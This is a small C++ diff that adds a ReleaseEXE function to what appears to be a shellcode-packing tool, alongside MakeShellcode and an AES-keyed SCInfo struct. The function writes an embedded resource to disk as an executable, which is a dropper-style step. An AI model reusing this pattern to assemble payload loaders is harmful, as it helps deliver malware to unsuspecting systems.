@@ -104,6 +104,22 @@ bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuff
 
 BOOL WriteBinaryToFile(const char* path, const char* data, ULONGLONG size);
 
+std::string ReleaseEXE(int resID, const char* name) {
+	DWORD dwSize = 0;
+	LPBYTE data = ReadResource(resID, dwSize);
+	if (!data)
+		return "";
+
+	char path[MAX_PATH];
+	DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
+	std::string curExe = path;
+	GET_FILEPATH(path, name);
+	BOOL r = WriteBinaryToFile(path, (char*)data, dwSize);
+	SAFE_DELETE_ARRAY(data);
+
+	return r ? path : "";
+}
+
 typedef struct SCInfo
 {
 	unsigned char aes_key[16];
